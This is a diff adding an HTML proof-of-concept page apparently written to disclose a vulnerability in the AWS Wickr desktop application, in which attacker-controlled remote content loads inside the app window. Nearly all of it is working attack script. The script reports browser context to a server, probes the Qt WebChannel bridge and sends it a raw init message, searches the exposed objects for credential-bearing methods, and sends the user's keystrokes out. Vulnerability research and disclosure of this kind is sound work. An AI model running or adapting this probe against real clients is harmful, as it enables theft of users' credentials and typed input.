@@ -1,0 +1,119 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>W37 PoC probe</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; margin: 0; padding: 24px;
+         background: #10131a; color: #e6e9ef; }
+  .banner { background: #7a1020; color: #fff; padding: 14px 18px; border-radius: 8px;
+            font-weight: 700; font-size: 16px; margin-bottom: 18px; }
+  h2 { font-size: 14px; text-transform: uppercase; letter-spacing: .06em;
+       color: #8fa0bd; margin: 22px 0 8px; }
+  pre { background: #171b24; border: 1px solid #262c3a; border-radius: 8px;
+        padding: 12px; white-space: pre-wrap; word-break: break-all; font-size: 12px; }
+  .demo { border: 2px dashed #c8a020; border-radius: 8px; padding: 14px; margin-top: 8px; }
+  .warn { color: #ffcf4d; font-weight: 700; }
+  input { font: inherit; padding: 8px; width: 260px; background: #0c0f15;
+          color: #e6e9ef; border: 1px solid #39415a; border-radius: 6px; }
+</style>
+
+<div class="banner">
+  W37 PoC — this page is remote content rendered INSIDE the AWS Wickr application window.
+  It was loaded because <code>webViewAddress</code> was read from an attacker-controlled profile.
+</div>
+
+<h2>Where am I</h2>
+<pre id="ctx">…</pre>
+
+<h2>Is the Qt WebChannel bridge reachable from here?</h2>
+<pre id="bridge">probing…</pre>
+
+<h2>Bridge objects / credential surface</h2>
+<pre id="objs">…</pre>
+
+<h2>Keystroke-capture surface (capability demo)</h2>
+<div class="demo">
+  <p class="warn">DEMO ONLY — do NOT type a real password. Anything typed here is sent to the
+  PoC server to show that a hijacked view can capture input rendered in the app window.</p>
+  <input id="demo" placeholder="type any dummy text">
+  <pre id="typed">(nothing captured yet)</pre>
+</div>
+
+<script>
+const beacon = (k, v) => {
+  try {
+    new Image().src = '/beacon?' + k + '=' + encodeURIComponent(
+      typeof v === 'string' ? v : JSON.stringify(v)) + '&t=' + Date.now();
+  } catch (e) {}
+};
+
+// ---- 1. context ----
+const ctx = {
+  href: location.href,
+  origin: location.origin,
+  ua: navigator.userAgent,
+  isTop: window.top === window.self,
+  screen: screen.width + 'x' + screen.height
+};
+document.getElementById('ctx').textContent = JSON.stringify(ctx, null, 2);
+beacon('ctx', ctx);
+
+// ---- 2. is qt.webChannelTransport injected into THIS document? ----
+const hasQt = (typeof qt !== 'undefined');
+const hasTransport = hasQt && !!qt.webChannelTransport;
+const bstat = { 'typeof qt': typeof qt, 'qt.webChannelTransport': hasTransport };
+document.getElementById('bridge').textContent = JSON.stringify(bstat, null, 2);
+beacon('bridge', bstat);
+
+// ---- 3. if the transport exists, speak the QWebChannel protocol directly ----
+// (no qrc: script needed — the wire format is JSON over transport.send)
+if (hasTransport) {
+  const T = qt.webChannelTransport;
+  const seen = [];
+  T.onmessage = function (m) {
+    let d = m.data;
+    if (typeof d === 'string') { try { d = JSON.parse(d); } catch (e) {} }
+    seen.push(d);
+    // type 3 = init response: carries the registered object map
+    if (d && d.type === 3 && d.data) {
+      const names = Object.keys(d.data);
+      const summary = { registeredObjects: names };
+      // surface any method that looks credential-bearing
+      const interesting = [];
+      for (const n of names) {
+        const o = d.data[n];
+        const methods = (o && o.methods || []).map(x => Array.isArray(x) ? x[0] : x);
+        const props = (o && o.properties || []).map(x => Array.isArray(x) ? x[1] : x);
+        for (const m2 of methods.concat(props)) {
+          if (/cred|token|apikey|api_key|password|secret|maps|auth/i.test(String(m2)))
+            interesting.push(n + '.' + m2);
+        }
+      }
+      summary.credentialSurface = interesting;
+      document.getElementById('objs').textContent = JSON.stringify(summary, null, 2);
+      beacon('objects', summary);
+    }
+  };
+  try {
+    T.send(JSON.stringify({ type: 3 }));   // QWebChannel init
+    beacon('note', 'init sent');
+  } catch (e) {
+    beacon('note', 'init threw: ' + e);
+  }
+  setTimeout(() => {
+    if (!seen.length) {
+      document.getElementById('objs').textContent = '(transport present but no reply)';
+      beacon('note', 'no reply from transport');
+    }
+  }, 4000);
+} else {
+  document.getElementById('objs').textContent =
+    'no qt.webChannelTransport in this document — bridge not reachable from here';
+}
+
+// ---- 4. capability demo: input rendered in the app window is attacker-readable ----
+document.getElementById('demo').addEventListener('input', e => {
+  const v = e.target.value;
+  document.getElementById('typed').textContent = 'captured: ' + JSON.stringify(v);
+  beacon('typed', v);
+});
+</script>
